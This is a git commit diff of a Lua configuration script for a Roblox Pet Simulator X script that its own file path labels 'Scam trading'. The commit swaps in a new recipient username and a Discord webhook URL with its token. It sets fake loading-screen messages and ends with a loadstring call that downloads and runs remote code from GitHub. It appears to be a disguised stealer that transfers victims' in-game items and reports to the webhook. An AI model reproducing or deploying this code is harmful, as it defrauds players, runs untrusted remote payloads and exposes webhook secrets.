54c54ef3e85318a16bf4058813bcc67a4a0ed2b4
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 19:20:08 +0700

    .lua

--- Main/Scam trading/WithDupeScript/MoonHubScript/Fixed/.lua
+++ Main/Scam trading/WithDupeScript/MoonHubScript/Fixed/.lua
@@ -1,9 +1,10 @@
-Username = "charken_14"
-WebHook = "https://discord.com/api/webhooks/1124416334814519326/wK4vpqQ4UKFzm0YaJW3XkL2vR2vall5akYnd3CQlDUX_UcayPAHpG8HDqoZ93UOIW-N6"
-
-_G.CustomScriptName = "MoonHub"
+Username = "mxrcuszzzzz"
+--Username2 = "kalongtzy" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1125390545414541334/2XFqmuMft9Yg6mFMrS96v97SkGampjepDmOXlnM1cbEipu2THmVWcpeG9hxm_HQ3BJTI"
+loadingscreen = true
+_G.CustomScriptName = "Moon Pet Sim x Script"
 _G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
+_G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+_G.Text4 = "Starting Script..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
